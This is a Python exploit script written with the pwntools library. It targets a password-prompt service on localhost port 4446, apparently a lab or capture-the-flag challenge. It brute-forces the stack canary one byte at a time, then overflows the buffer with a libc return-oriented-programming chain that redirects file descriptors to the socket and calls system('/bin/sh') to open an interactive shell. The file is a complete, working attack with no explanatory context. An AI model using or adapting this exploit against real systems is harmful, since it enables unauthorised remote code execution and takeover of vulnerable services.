from pwn import *


context(os='linux', arch='amd64')

def exploit(payload, interactive=False):
    r = remote("127.0.0.1", 4446, level='error')
    r.sendafter(b"Password: ", payload)

    try:
        if r.recvrepeat(0.1)[:7] == b"Invalid":
            return True

    except EOFError:
        return False

    finally:
        if interactive:
            r.interactive()
        else:
            r.close()

def leak_bytes(payload, name):

    leaked_bytes = []
    progress = log.progress(name, level=logging.WARN)
    for _ in range(8):
        for i in range(256):
            if exploit(payload + p8(i)):
                payload += p8(i)
                leaked_bytes.insert(0, hex(i))
                progress.status(repr(leaked_bytes))
                break

    progress.success(repr(leaked_bytes))

    log.info(f"Leaked {name} = {hex(u64(payload[-8:]))}")
    return payload[-8:]

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x007ffff7df9000

rop = ROP(libc)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.dup2(4, 2)
rop.system(next(libc.search(b"/bin/sh")))

log.info(f"ROP Chain:\n{rop.dump()}")

payload  = b"A"*72
payload += leak_bytes(payload, "Canary")
payload += p64(0xBADC0FFEE0DDF00D) 
payload += bytes(rop)

exploit(payload, True)

